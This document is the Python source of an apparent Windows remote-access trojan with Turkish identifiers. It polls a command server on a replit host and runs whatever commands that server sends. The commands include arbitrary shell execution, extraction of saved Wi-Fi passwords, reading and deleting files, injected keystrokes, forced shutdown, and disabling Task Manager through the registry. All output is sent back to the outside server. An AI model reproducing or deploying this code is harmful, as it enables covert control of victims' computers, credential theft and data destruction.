import requests as req
from time import sleep
import os
import sys
import subprocess
import threading
#import win32gui, win32con
import webbrowser as wb
#import pyscreenshot as ss
from urllib3.exceptions import InsecureRequestWarning
import base64
import keyboard as kb

'''the_program_to_hide = win32gui.GetForegroundWindow()
win32gui.ShowWindow(the_program_to_hide , win32con.SW_HIDE)'''


# Suppress only the single warning from urllib3 needed.
req.packages.urllib3.disable_warnings(category=InsecureRequestWarning)


def apend(dosyadı, icerik):
    ic = icerik.split("///")
    with open(dosyadı, "a") as f:
        for i in ic:
            f.write(i)
            f.writelines("\n")
    req.post("https://musallat.zgretin.repl.co/musallat", data={"nm":f"\n{dosyadı}: {ic}"}, verify=False)

def writ(dosyadı):
    with open(dosyadı, "w") as f:
        f.write("")
    req.post("https://musallat.zgretin.repl.co/musallat", data={"nm":f"\n{dosyadı}: içerikn ilindi"}, verify=False)
    
def oku(dosyadı):
    with open(dosyadı, "r") as f:
        okunan = f.read()
    req.post("https://musallat.zgretin.repl.co/musallat", data={"nm":f"\n{dosyadı}:\n{okunan}"}, verify=False)

def dosyasil(dosyadı):
    os.remove(dosyadı)
    req.post("https://musallat.zgretin.repl.co/musallat", data={"nm":f"\n{dosyadı}:\n dosya silindi"}, verify=False)


while True:
    try:
        def intsifre():
            şifreler = []
            # getting meta data
            meta_data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles'])

            # decoding meta data
            data = meta_data.decode('utf-8', errors="backslashreplace")

            # spliting data by line by line
            data = data.split('\n')

            # creating a list of profiles
            profiles = []

            # traverse the data
            for i in data:

                # find "All User Profile" in each item
                if "All User Profile" in i:
                    # if found
                    # split the item
                    i = i.split(":")


                    # item at index 1 will be the wifi name
                    i = i[1]


                    # formatting the name
                    # first and last chracter is use less
                    i = i[1:-1]


                    # appending the wifi name in the list
                    profiles.append(i)

            #for asd in profiles:
            #    print(asd)
            #    results = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', str(asd), "key=clear"])
            #    results = results.decode('utf-8', errors="backslashreplace")
            #    results = results.split('\n')
            #    results = [b.split(":")[1][1:-1] for b in results if "Key Content" in b]
            #    print(results[0])

            # printing heading
            #print("{:<30}| {:<}".format("Wi-Fi Name", "Password"))
            #print("----------------------------------------------")

            # traversing the profiles
            for i in profiles:

                # try catch block beigins
                # try block
                try:
                    # getting meta data with password using wifi name
                    results = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', i, 'key=clear'])

                    # decoding and splitting data line by line
                    results = results.decode('utf-8', errors="backslashreplace")
                    results = results.split('\n')

                    # finding password from the result list
                    results = [b.split(":")[1][1:-1] for b in results if "Key Content" in b]

                    # if there is password it will print the pass word
                    try:
                        #print("{:<30}| {:<}".format(i, results[0]))
                        şifreler.append("{:<10}| {:<}".format(i, results[0]))
                        #with open("sifrreee.txt", "a")as f:
                        #    f.writelines("{:<30}| {:<}".format(i, results[0]))
                        #    f.writelines("\n")

                    # else it will print blank in fornt of pass word
                    except IndexError:
                        #print("{:<30}| {:<}".format(i, ""))
                        şifreler.append("{:<10}| {:<}".format(i, ""))



                # called when this process get failed
                except subprocess.CalledProcessError:
                    #print("Encoding Error Occured")
                    return "Encoding Error Occured"
            return şifreler


        def yaz(yazı):
            if yazı != "":
                kb.write(yazı)
                req.post("https://musallat.zgretin.repl.co/musallat", data={"nm":f"bunu yazdın: {yazı}"}, verify=False)
            else:
                
                kb.send("enter")
                req.post("https://musallat.zgretin.repl.co/musallat", data={"nm":"enter"}, verify=False)

        def tıkla(tus):
            kb.send(tus)
            req.post("https://musallat.zgretin.repl.co/musallat", data={"nm":f"tıkladın {tus}"}, verify=False)

        def gönder(bilgi):
            req.post("https://musallat.zgretin.repl.co/musallat", data={"nm":bilgi}, verify=False)

        def komutçalıştır(komut):
            #os.system(komut)
            sb = subprocess.Popen(komut, stdout=subprocess.PIPE, shell=True)
            sb, err=sb.communicate()
            sbb = sb.decode('utf-8', errors="backslashreplace")
            req.post("https://musallat.zgretin.repl.co/musallat", data={"nm":f"{sbb}"}, verify=False)

        def asılkomut(komut):
            sonuc = subprocess.run(komut.split(" "), shell=True, capture_output=True)
            req.post("https://musallat.zgretin.repl.co/musallat", data={"nm": f"{sonuc.stdout.decode('utf-8', errors='backslashreplace')}"}, verify=False)
        data = {"nm":"nul"}
        while True:

            r = req.get("https://musallat.zgretin.repl.co/gidecekbilgi", verify=False)

            if r.text != "nul" and r.text.startswith("/"):
                print(r.text)
                geln = r.text.replace("/", "", 1)

                #işlemler
                if geln == "intşif":
                    #gönder(intsifre())
                    print(intsifre())
                    req.post("https://musallat.zgretin.repl.co/musallat", data={"nm": f"{intsifre()}"}, verify=False)
                elif geln == "null":
                    os.system("taskkill /im musallat.exe /f")
                elif geln == "listdir":
                    print(os.listdir())
                    req.post("https://musallat.zgretin.repl.co/musallat", data={"nm": f"{os.listdir()}"}, verify=False)
                elif geln.startswith("kmt:"):
                    komut = geln.replace("kmt:", "")
                    print(komut)
                    komuttread = threading.Thread(target = komutçalıştır, args=[komut])
                    komuttread.start()
                elif geln.startswith("cmd:"):
                    komut = geln.replace("cmd:", "")
                    print(komut)
                    komuttread2 = threading.Thread(target = asılkomut, args=[komut])
                    komuttread2.start()

                elif geln.startswith("aç:"):
                    url = geln.replace("aç:", "")
                    wb.open(url)

                elif geln.startswith("yaz:"):
                    yazı = geln
                    yazı =yazı.replace("yaz:", "")
                    yaz(yazı)


                elif geln.startswith("tık:"):
                    tus = geln.replace("tık:", "")
                    tıkla(tus)
                                       

                elif geln.startswith("run:"):
                    sonuçç = subprocess.run(["start", geln.replace("run:", "")], shell=True, capture_output=True)
                    req.post("https://musallat.zgretin.repl.co/musallat",
                             data={"nm": f"{sonuçç.stdout.decode('utf-8', errors='backslashreplace')}"}, verify=False)

                elif geln.startswith("kapa:"):
                    komutt = geln.replace("kapa:", "")
                    sonuç = subprocess.run(["taskkill", "/im", komutt, "/f"], shell=True, capture_output=True)
                    req.post("https://musallat.zgretin.repl.co/musallat",
                             data={"nm": f"{sonuç.stdout.decode('utf-8', errors='backslashreplace')}"}, verify=False)

                elif geln == "ss:":
                    pass
                    #req.post("https://musallat.zgretin.repl.co/ssgelenyer",data={"nm": "şimdilik yok"}, verify=False)

                elif geln == "tk":
                    os.system("taskkill /f /im taskmgr.exe")
                    req.post("https://musallat.zgretin.repl.co/musallat", data={"nm": f"{'kapadım'}"}, verify=False)

                elif geln == "sd:":
                    os.system("shutdown /s /t 1")

                elif geln == "res:":
                    os.system("shutdown /r /t 1")

                elif geln == "disabletask:":
                    subprocess.run("reg add HKCUSoftwareMicrosoftWindowsCurrentVersionPoliciesSystem /v DisableTaskMgr /t REG_DWORD /d 1 /f", shell=True, capture_output=True)

                elif geln == "enabletask":
                    subprocess.run("reg add HKCUSoftwareMicrosoftWindowsCurrentVersionPoliciesSystem /v DisableTaskMgr /t REG_DWORD /d 0 /f", shell=True, capture_output=True)

                elif geln.startswith("append:"):
                    geln = geln.replace("append:", "")
                    geln = geln.split(" ", 1)
                    apend(geln[0], str(geln[1]))

                elif geln.startswith("write:"):
                    geln = geln.replace("write:", "")
                    writ(geln)

                elif geln.startswith("read:"):
                    geln = geln.replace("read:", "")
                    oku(geln)

                elif geln.startswith("sil:"):
                    geln = geln.replace("sil:", "")
                    dosyasil(geln)
                
                
                else:
                    req.post("https://musallat.zgretin.repl.co/musallat", data={"nm":f"{geln}"}, verify=False)

                req.post("https://musallat.zgretin.repl.co/gidecekbilgi", data=data, verify=False)
            else:
                sleep(0.2)
    except Exception as e:
        print(e)
        req.post("https://musallat.zgretin.repl.co/musallat", data={"nm": f"{e}"}, verify=False)
    sleep(1)

    
